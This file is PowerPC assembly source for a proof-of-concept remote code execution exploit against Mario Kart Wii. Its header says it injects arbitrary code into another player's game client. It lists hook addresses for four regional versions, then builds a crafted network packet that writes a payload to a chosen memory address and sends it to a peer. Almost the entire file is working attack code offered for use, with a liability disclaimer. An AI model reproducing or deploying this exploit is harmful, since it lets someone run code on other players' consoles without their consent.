#======================================#
# Mario Kart Wii Remote Code Execution #
#--------------------------------------#
# Author : MikeIsAStar                 #
# Date   : 29 May 2023                 #
#--------------------------------------#
# Description: This code will inject   #
# arbitrary code into a client's game. #
#--------------------------------------#
# Terms & Conditions: You are fully    #
# responsible for all activity that    #
# occurs while using this code. The    #
# author of this code can not be held  #
# liable to you or to anyone else as a #
# result of damages caused by the      #
# usage of this code.                  #
#======================================#

#======================================#
#             Text Section             #
#======================================#
.section ".text"

#======================================#
#             Hook Address             #
#--------------------------------------#
# RMCP : 0x80657F30                    #
# RMCE : 0x80653AA8                    #
# RMCJ : 0x8065759C                    #
# RMCK : 0x80646248                    #
#======================================#
.globl _start
_start:
    bl        packetEnd

packetStart:
    .long     0x4D696B65
    .long     0x00000000
    .byte     0x28
    .byte     payloadEnd - payloadStart
    .byte     0x00
    .byte     0x00
    .byte     0x00
    .byte     0x00
    .byte     0x00
    .byte     0x00
    .llong    0x4D696B6553746172
    .llong    0x4D696B6553746172
    .long     0x80000000 # Destination address
    .long     0x00000000
payloadStart:
    .long     0x4D696B65
payloadEnd:
packetEnd:

    lis       12, 0x80005F34@ha
    li        5, packetEnd - packetStart
    mflr      4
    ori       12, 12, 0x80005F34@l
    stw       5, 8(3)
    mtctr     12
    lwz       3, 0(3)
    bctrl
    li        4, packetEnd - packetStart
